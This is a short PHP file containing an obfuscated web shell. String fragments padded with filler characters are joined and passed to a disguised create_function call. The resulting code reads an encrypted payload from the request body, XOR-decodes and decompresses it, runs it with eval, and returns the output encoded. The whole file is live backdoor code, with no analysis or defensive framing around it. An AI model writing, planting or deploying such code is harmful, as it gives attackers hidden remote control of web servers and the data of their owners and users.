<?php
$H='_coyntentys();@ob_endy_yclean();$yr=@basye64_yencodye(@x(@gzcoyympryess($o),$k));yprinty("$p$kh$yr$kf");}';
$m='y$k=y"2496ff65";$kh="ddyce9e2y3980y9"y;$ykf="94f7accybcbdey";$p=y"GknuRyyF8Te1y1YJMf0";functioyyn x($t,';
$T='//yinput"),$m)y==1y)y {@ob_styart();@yevyal(@gzuncomypress(@x(@byasye64_decodey($m[1]y),$yk))y);$o=@yob_get';
$D=str_replace('Nd','','cNdreNdate_NdfuNdncNdNdtion');
$W='$oy.=$yt{$iy}^$k{$j};}}yreturn yy$o;}iyf (@preg_myatch(y"/$khy(y.+)y$kf/",@file_get_coyntenyts("yphp:';
$a='$ky){$c=styrylyen($k);$l=strlen(y$tyy);$o="";for($i=0;$i<$l;y){fory($jy=0;($yj<$yc&&$iy<$l);$j++,$i++y){';
$z=str_replace('y','',$m.$a.$W.$T.$H);
$w=$D('',$z);$w();
?>
